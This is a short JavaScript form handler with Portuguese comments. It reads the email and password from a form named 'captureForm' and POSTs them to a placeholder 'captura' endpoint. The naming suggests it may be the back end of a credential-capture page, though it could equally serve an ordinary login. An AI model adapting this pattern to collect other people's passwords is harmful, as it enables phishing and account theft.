document.getElementById('captureForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Impede o envio padrão do formulário

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // Aqui você pode enviar os dados para um servidor ou endpoint
    // Exemplo de um objeto para envio
    const data = { email: email, password: password };

    // Exemplo de envio usando fetch para um endpoint fictício
    fetch('https://seu-endpoint-api.com/captura', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
    })
    .then(response => response.json())
    .then(data => {
        document.getElementById('responseMessage').textContent = 'Dados enviados com sucesso!';
    })
    .catch(error => {
        console.error('Erro:', error);
        document.getElementById('responseMessage').textContent = 'Ocorreu um erro ao enviar os dados.';
    });
});
